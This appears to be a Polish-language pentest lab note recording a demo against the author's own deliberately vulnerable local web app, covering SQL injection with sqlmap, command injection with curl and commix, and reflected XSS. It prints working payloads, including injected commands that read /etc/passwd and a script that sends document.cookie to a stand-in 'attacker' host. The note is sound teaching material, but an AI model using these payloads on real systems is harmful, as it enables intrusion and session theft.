---
title: "Live demo I-V-E — 3 wektory: SQLi, command injection, XSS"
date: 2026-08-16
tags: [ive, demo, sqli, rce, xss, lab, analiza-dynamiczna]
category: pentest
status: active
---

# Live demo: I → V → E na lokalnym celu (3 wektory)

Pełny łańcuch na **własnym lokalnym celu** — podatna apka `/opt/ive/vulnapp2.py`
na `127.0.0.1:9001` tego hosta. Trzy celowe luki pokazują, że **SQLi to tylko jeden**
z wektorów fazy E. **Zero cudzych systemów.**

## Cel (3 luki)

| Endpoint | Luka | Sink |
|----------|------|------|
| `/user?id=X` | SQL Injection | `"SELECT ... WHERE id = " + uid` |
| `/ping?ip=X` | Command injection (RCE) | `subprocess.getoutput("ping ... " + ip)` |
| `/search?q=X` | Reflected XSS | `"<h1>..." + q` (bez eskejpowania) |

## Wektor 1 — SQLi (E → sqlmap)

`sqlmap -u "http://127.0.0.1:9001/user?id=1" --batch --banner --dump-all`

- 3 typy injekcji: boolean-blind, time-based, UNION (4 kolumny)
- DBMS: **SQLite 3.45.1**
- `dump-all` → tabela `users` → **`FLAG{IVE_DEMO_SQLI_ADMIN}`**

## Wektor 2 — Command injection / RCE (E → manual + commix)

**Manualnie** (`curl`):

```
/ping?ip=127.0.0.1;id         → uid=0(root) gid=0(root) groups=0(root)
/ping?ip=127.0.0.1;whoami     → root
/ping?ip=$(hostname)          → vserver959630  (command substitution)
/ping?ip=x;cat /etc/passwd    → root:x:0:0:root:/root:/bin/bash ...
```

**Automatu — commix v4.2.dev66** (`--os-cmd=id --batch`):

```
[info] GET parameter 'ip' appears to be injectable via (results-based) classic
       command injection technique.
       Payload: 127.0.0.1;echo ZWPTLC$((41+28))$(echo ZWPTLC)ZWPTLC
[info] Executing user-supplied command 'id'.
[info] 'id' execution output: uid=0(root) gid=0(root) groups=0(root)
```

> commix = "sqlmap dla command injection". Uwaga z demo: przy parametrze nazwanym
> `host` commix mylił go z nagłówkiem HTTP `Host` i nie wykrywał luki — po zmianie
> nazwy na `ip` wykrył i wykonał `id`. Dobra ilustracja, że automat potrafi przegapić
> to, co łapie ręczny test.

## Wektor 3 — Reflected XSS (E → manual)

```
/search?q=<script>alert(document.domain)</script>
→ <h1>Search results for: <script>alert(document.domain)</script></h1>

/search?q=<script>new Image().src='http://attacker?c='+document.cookie</script>
→ payload kradnący cookie (odbity bez eskejpowania)
```

## Surowe pliki (każda linia)

| Plik | Faza | Treść |
|------|------|-------|
| `i1_nmap_sV.txt` | I | nmap -sV (BaseHTTPServer 0.6 / Python 3.12.3) |
| `i2_nmap_http_scripts.txt` | I | nmap http-title/headers/enum |
| `i3_curl_headers.txt` | I | nagłówki HTTP (Server: BaseHTTP/0.6) |
| `v1_nuclei_techdetect.txt` | V | tech-detect → python |
| `v2_nuclei_headers.txt` | V | 10 braków nagłówków |
| `e1_sqlmap_banner.txt` | E | SQLi detekcja + banner |
| `e2_sqlmap_dumpall.txt` | E | dump tabel (FLAG) |
| `e3_cmdinj_id.txt` | E | `;id` → root |
| `e3_cmdinj_whoami.txt` | E | `;whoami` → root |
| `e3_cmdinj_subst.txt` | E | `$(hostname)` |
| `e3_cmdinj_readfile.txt` | E | `;cat /etc/passwd` |
| `e4_commix_cmdinj.txt` | E | commix: detekcja + `id` → root |
| `e5_xss_reflected.txt` | E | <script> odbity |
| `e5_xss_cookiestealer.txt` | E | payload kradzieży cookie |

## Wnioski

- **SQLi** → kradzież danych z bazy (sqlmap).
- **Command injection** → pełny RCE (manual + commix) — gorsze niż SQLi.
- **XSS** → JavaScript w przeglądarce ofiary (kradzież sesji/cookie).
- Automaty (sqlmap, commix) przyspieszają, ale ręczny test bywa skuteczniejszy.

## Powiązane

- [[Model_IVE/IVE_MOC]] · [[Model_IVE/E_Eksploatacja/Sqlmap]] · [[Model_IVE/E_Eksploatacja/Metasploit]] · [[Model_IVE/E_Eksploatacja/Nuclei]]
